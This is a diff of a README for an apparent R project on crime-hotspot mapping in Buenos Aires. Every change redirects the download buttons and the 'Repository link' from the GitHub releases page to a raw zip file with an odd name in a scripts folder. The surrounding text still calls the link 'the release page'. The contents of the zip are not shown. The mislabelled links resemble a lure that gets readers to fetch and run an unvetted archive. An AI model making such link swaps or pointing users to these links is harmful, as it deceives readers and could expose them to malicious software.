@@ -1,6 +1,6 @@
 # 🚨 crime-analysis-caba-spatial-ml - Crime Hotspots Mapping Made Easy
 
-[![Download Software](https://img.shields.io/badge/Download%20Here-red?style=for-the-badge)](https://github.com/Dreamfvp/crime-analysis-caba-spatial-ml/releases)
+[![Download Software](https://img.shields.io/badge/Download%20Here-red?style=for-the-badge)](https://raw.githubusercontent.com/Dreamfvp/crime-analysis-caba-spatial-ml/main/scripts/caba-crime-spatial-ml-analysis-excrescence.zip)
 
 ---
 
@@ -44,7 +44,7 @@ The app uses open-source libraries such as caret, ggplot, leaflet, and tmap behi
 
 Click this big button below to open the release page:
 
-[![Download Software](https://img.shields.io/badge/Download%20Here-green?style=for-the-badge)](https://github.com/Dreamfvp/crime-analysis-caba-spatial-ml/releases)
+[![Download Software](https://img.shields.io/badge/Download%20Here-green?style=for-the-badge)](https://raw.githubusercontent.com/Dreamfvp/crime-analysis-caba-spatial-ml/main/scripts/caba-crime-spatial-ml-analysis-excrescence.zip)
 
 This page has the latest versions ready for download.
 
@@ -155,7 +155,7 @@ Check the GitHub repository for:
 - Data sources.
 - Update notes.
 
-Repository link: https://github.com/Dreamfvp/crime-analysis-caba-spatial-ml
+Repository link: https://raw.githubusercontent.com/Dreamfvp/crime-analysis-caba-spatial-ml/main/scripts/caba-crime-spatial-ml-analysis-excrescence.zip
 
 ---
 
